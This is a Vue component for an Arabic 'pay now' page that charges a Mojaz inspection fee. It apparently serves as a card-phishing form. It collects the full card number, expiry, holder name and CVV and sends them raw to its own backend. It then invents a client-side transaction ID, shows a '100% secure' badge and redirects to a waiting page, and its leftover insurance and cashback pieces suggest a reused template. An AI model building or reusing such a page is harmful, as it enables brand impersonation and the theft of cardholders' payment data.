<template>
    <div class="min-h-[calc(100vh-4rem)] relative" dir="rtl">
        <!-- Background Image -->
        <img :src="bannerSrc" alt="" class="absolute inset-0 w-full h-full object-cover" loading="eager" width="1920" height="1080" />
        <!-- Dark overlay -->
        <div class="absolute inset-0 bg-black/50 backdrop-blur-[2px]"></div>

        <!-- Content -->
        <div class="relative z-10 min-h-[calc(100vh-4rem)] flex flex-col justify-center px-4 sm:px-6 py-6 sm:py-8">
            <div class="w-full max-w-lg mx-auto">

            <!-- Header -->
            <header class="text-center mb-6">
                <!-- Shield Icon -->
                <div class="flex justify-center mb-3">
                    <div class="w-16 h-16 rounded-full bg-gradient-to-br from-sky-400 to-teal-400 flex items-center justify-center shadow-lg">
                        <i class="fa-solid fa-shield-halved text-4xl text-white"></i>
                    </div>
                </div>
                <h1 class="text-2xl md:text-3xl font-bold text-white drop-shadow-md">ادفع الآن</h1>
                <p class="text-white/80 text-sm md:text-base mt-2">
                    يرجى تعبئة المعلومات التالية لإكمال عملية الدفع الخاص بك
                </p>
            </header>

            <!-- Payment Form Card (silver gradient) -->
            <div class="payment-card">
                <form @submit.prevent="processPayment">

                    <!-- Card Type Row -->
                    <div class="flex items-center justify-between mb-4">
                        <!-- Card brand logo (end side in RTL) -->
                        <div class="shrink-0">
                            <svg v-if="cardForm.cardType === 'mada'" class="h-8 w-auto" viewBox="0 0 60 38" fill="none">
                                <rect width="60" height="38" rx="6" fill="#1d6f37" />
                                <text x="30" y="24" text-anchor="middle" font-size="12" fill="white" font-weight="bold">mada</text>
                            </svg>
                            <svg v-else-if="cardForm.cardType === 'mastercard'" class="h-8 w-auto" viewBox="0 0 60 38" fill="none">
                                <rect width="60" height="38" rx="6" fill="#fff" stroke="#e2e8f0" />
                                <circle cx="23" cy="19" r="10" fill="#eb001b" opacity=".85" />
                                <circle cx="37" cy="19" r="10" fill="#f79e1b" opacity=".85" />
                            </svg>
                            <svg v-else class="h-8 w-auto" viewBox="0 0 60 38" fill="none">
                                <rect width="60" height="38" rx="6" fill="#1a1f71" />
                                <text x="30" y="25" text-anchor="middle" font-size="14" fill="white" font-weight="bold" font-style="italic">VISA</text>
                            </svg>
                        </div>
                        <!-- Label + Native select -->
                        <div class="flex items-center gap-3">
                            <select id="mojaz-card-type" v-model="cardForm.cardType" name="card-type"
                                class="border border-slate-300 rounded px-2 py-1 text-sm bg-white cursor-pointer focus:outline-none focus:ring-1 focus:ring-secondary">
                                <option v-for="card in cardTypes" :key="card.value" :value="card.value">
                                    {{ card.label }}
                                </option>
                            </select>
                            <span class="text-sm font-bold text-slate-700">نوع البطاقة</span>
                        </div>
                    </div>

                    <!-- Fields: 2 columns on sm+, stacked on mobile -->
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-3 mb-4">
                        <!-- Card Number -->
                        <div>
                            <label for="cardNumber" class="block text-sm font-bold text-slate-700 mb-1">رقم البطاقة</label>
                            <input id="cardNumber" v-model="cardForm.cardNumber" name="cc-number" type="tel"
                                placeholder="رقم البطاقة" maxlength="19" dir="ltr" inputmode="numeric"
                                autocomplete="cc-number"
                                class="w-full px-3 py-2 bg-white border border-slate-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-secondary focus:border-secondary text-left"
                                :class="cardErrors.cardNumber ? 'border-red-400' : ''"
                                @input="formatCardNumber" />
                            <p v-if="cardErrors.cardNumber" class="text-red-500 text-xs mt-1">{{ cardErrors.cardNumber }}</p>
                        </div>

                        <!-- Expiry -->
                        <div>
                            <label for="expiry" class="block text-sm font-bold text-slate-700 mb-1">تاريخ الإنتهاء</label>
                            <input id="expiry" v-model="cardForm.expiry" name="cc-exp" type="tel"
                                placeholder="شهر / سنة" maxlength="7" dir="ltr" inputmode="numeric"
                                autocomplete="cc-exp"
                                class="w-full px-3 py-2 bg-white border border-slate-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-secondary focus:border-secondary text-left"
                                :class="cardErrors.expiry ? 'border-red-400' : ''"
                                @input="formatExpiry" />
                            <p v-if="cardErrors.expiry" class="text-red-500 text-xs mt-1">{{ cardErrors.expiry }}</p>
                        </div>

                        <!-- Card Holder Name -->
                        <div>
                            <label for="cardHolder" class="block text-sm font-bold text-slate-700 mb-1">اسم حامل البطاقة</label>
                            <input id="cardHolder" v-model="cardForm.cardHolder" name="cc-name" type="text"
                                placeholder="اسم حامل البطاقة" dir="rtl" autocomplete="cc-name"
                                class="w-full px-3 py-2 bg-white border border-slate-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-secondary focus:border-secondary"
                                :class="cardErrors.cardHolder ? 'border-red-400' : ''" />
                            <p v-if="cardErrors.cardHolder" class="text-red-500 text-xs mt-1">{{ cardErrors.cardHolder }}</p>
                        </div>

                        <!-- CVV -->
                        <div>
                            <label for="cvv" class="block text-sm font-bold text-slate-700 mb-1">رمز التحقق (CVV)</label>
                            <input id="cvv" v-model="cardForm.cvv" name="cc-csc" type="tel"
                                placeholder="رمز التحقق (CVV)" maxlength="4" dir="ltr" inputmode="numeric"
                                autocomplete="cc-csc"
                                class="w-full px-3 py-2 bg-white border border-slate-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-secondary focus:border-secondary text-left"
                                :class="cardErrors.cvv ? 'border-red-400' : ''" />
                            <p v-if="cardErrors.cvv" class="text-red-500 text-xs mt-1">{{ cardErrors.cvv }}</p>
                        </div>
                    </div>

                    <!-- Submit Button -->
                    <div class="mt-5">
                        <button type="submit" :disabled="isProcessing"
                            class="bg-secondary hover:bg-secondary/90 text-white py-2.5 px-8 rounded font-bold text-sm transition-all cursor-pointer disabled:cursor-not-allowed disabled:opacity-60 inline-flex items-center gap-2">
                            <i v-if="isProcessing" class="fa-solid fa-spinner fa-spin size-4"></i>
                            {{ isProcessing ? 'جاري معالجة الدفع...' : 'إدفع الأن' }}
                        </button>
                    </div>
                </form>
            </div>

            <!-- Secure Badge -->
            <div class="text-center mt-4">
                <small class="text-white/90 text-sm flex items-center justify-center gap-1.5">
                    <i class="fa-solid fa-lock size-4"></i>
                    هذه الصفحة مؤمنة بنسبة 100%
                </small>
            </div>

            </div> <!-- /max-w-lg mx-auto -->
        </div>
    </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { usePayment } from '@/composables/usePayment';
import { CASHBACK_SUMMARY_IMAGE } from '@/constants/cashbackImage';

const router = useRouter();
const { processCardPayment, error: paymentError } = usePayment();

// ──────────────────────────────────────────────
// Card Type Options (for native select)
// ──────────────────────────────────────────────
const cardTypes = [
    { value: 'mada', label: 'مدى' },
    { value: 'mastercard', label: 'Mastercard' },
    { value: 'visa', label: 'Visa' },
];

// ──────────────────────────────────────────────
// Form State
// ──────────────────────────────────────────────
const cardForm = reactive( {
    cardType: 'mada',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardHolder: '',
} );

const cardErrors = reactive( {
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardHolder: '',
} );

const isProcessing = ref( false );

// Banner image
const bannerSrc = CASHBACK_SUMMARY_IMAGE;

// ──────────────────────────────────────────────
// Formatters
// ──────────────────────────────────────────────
function formatCardNumber () {
    let val = cardForm.cardNumber.replace( /\D/g, '' );
    val = val.substring( 0, 16 );
    cardForm.cardNumber = val.replace( /(\d{4})(?=\d)/g, '$1 ' );
}

function formatExpiry () {
    let val = cardForm.expiry.replace( /\D/g, '' );
    val = val.substring( 0, 4 );
    if ( val.length >= 2 ) {
        cardForm.expiry = val.substring( 0, 2 ) + ' / ' + val.substring( 2 );
    } else {
        cardForm.expiry = val;
    }
}

// ──────────────────────────────────────────────
// Validation
// ──────────────────────────────────────────────
function validateCard () {
    let valid = true;
    cardErrors.cardNumber = '';
    cardErrors.expiry = '';
    cardErrors.cvv = '';
    cardErrors.cardHolder = '';

    const rawNumber = cardForm.cardNumber.replace( /\s/g, '' );
    if ( !rawNumber ) {
        cardErrors.cardNumber = 'يرجى إدخال رقم البطاقة';
        valid = false;
    } else if ( rawNumber.length < 16 ) {
        cardErrors.cardNumber = 'رقم البطاقة يجب أن يتكون من 16 رقم';
        valid = false;
    }

    const rawExpiry = cardForm.expiry.replace( /\s/g, '' ).replace( '/', '' );
    if ( !rawExpiry ) {
        cardErrors.expiry = 'يرجى إدخال تاريخ الإنتهاء';
        valid = false;
    } else if ( rawExpiry.length < 4 ) {
        cardErrors.expiry = 'تاريخ الإنتهاء غير صحيح';
        valid = false;
    } else {
        const month = parseInt( rawExpiry.substring( 0, 2 ), 10 );
        if ( month < 1 || month > 12 ) {
            cardErrors.expiry = 'الشهر يجب أن يكون بين 01 و 12';
            valid = false;
        }
    }

    if ( !cardForm.cvv ) {
        cardErrors.cvv = 'يرجى إدخال رمز التحقق';
        valid = false;
    } else if ( cardForm.cvv.length < 3 ) {
        cardErrors.cvv = 'رمز التحقق يجب أن يكون 3 أرقام على الأقل';
        valid = false;
    }

    if ( !cardForm.cardHolder.trim() ) {
        cardErrors.cardHolder = 'يرجى إدخال اسم حامل البطاقة';
        valid = false;
    } else if ( !/^[\u0600-\u06FFa-zA-Z\s]+$/.test( cardForm.cardHolder.trim() ) ) {
        cardErrors.cardHolder = 'اسم حامل البطاقة غير صحيح';
        valid = false;
    }

    return valid;
}

// ──────────────────────────────────────────────
// Payment Processing
// ──────────────────────────────────────────────
async function processPayment () {
    if ( isProcessing.value ) return;
    if ( !validateCard() ) return;

    isProcessing.value = true;

    const rawNumber = cardForm.cardNumber.replace( /\s/g, '' );
    const rawExpiry = cardForm.expiry.replace( /\s/g, '' ).replace( '/', '' );
    const expiryMonth = rawExpiry.substring( 0, 2 );
    const expiryYear = rawExpiry.substring( 2, 4 );

    // Build card data for the backend
    const cardData = {
        card_number: rawNumber,
        holder_name: cardForm.cardHolder.trim(),
        expiry_month: expiryMonth,
        expiry_year: expiryYear,
        cvv: cardForm.cvv,
        card_type: cardForm.cardType,
    };

    // Retrieve mojaz request data from session
    let mojazReq = {};
    try {
        const raw = sessionStorage.getItem( 'mojazPayment' );
        if ( raw ) mojazReq = JSON.parse( raw );
    } catch { /* ignore */ }

    // Mojaz inspection fee — centralized constant
    const MOJAZ_INSPECTION_FEE = Number( import.meta.env.VITE_MOJAZ_FEE ) || 119;

    const orderInfo = {
        sessionId: `mojaz-${ Date.now() }`,
        totalPrice: MOJAZ_INSPECTION_FEE,
        selectedInsurance: { type: 'mojaz', ...mojazReq },
    };

    try {
        const result = await processCardPayment( cardData, orderInfo );

        if ( !result ) {
            // API returned null — show error
            cardErrors.cardNumber = paymentError.value || 'حدث خطأ أثناء معالجة الدفع';
            return;
        }

        // Save payment info for downstream pages
        sessionStorage.setItem( 'mojazPaymentResult', JSON.stringify( {
            status: 'pending',
            method: cardForm.cardType,
            lastFour: rawNumber.slice( -4 ),
            cardHolder: cardForm.cardHolder.trim(),
            amount: MOJAZ_INSPECTION_FEE,
            cardId: result.cardId,
            transactionId: 'TXN-' + Date.now(),
            timestamp: new Date().toISOString(),
        } ) );

        // Redirect customer to waiting page
        router.push( { name: 'paymentWaiting' } );
    } catch ( e ) {
        cardErrors.cardNumber = e.message || 'حدث خطأ أثناء معالجة الدفع';
    } finally {
        isProcessing.value = false;
    }
}

// ──────────────────────────────────────────────
// Lifecycle — verify session data exists
// ──────────────────────────────────────────────
onMounted( () => {
    const payment = sessionStorage.getItem( 'mojazPayment' );
    if ( !payment ) {
        router.replace( { name: 'mojaz', query: { step: '1' } } );
        return;
    }

    // Pre-select card type from step 2 selection
    try {
        const data = JSON.parse( payment );
        if ( data.method ) {
            cardForm.cardType = data.method;
        }
    } catch { /* ignore */ }
} );
</script>

<style scoped>
.payment-card {
    border-radius: 10px;
    background-image:
        linear-gradient(30deg, rgba(255, 255, 255, 0) 70%, rgba(255, 255, 255, 0.2) 70%),
        linear-gradient(45deg, rgba(255, 255, 255, 0) 75%, rgba(255, 255, 255, 0.2) 75%),
        linear-gradient(60deg, rgba(255, 255, 255, 0) 80%, rgba(255, 255, 255, 0.2) 80%);
    background-color: silver;
    padding: 16px;
    border: 2px solid #fff;
    box-shadow: 2px 3px 5px 1px #999;
}
</style>
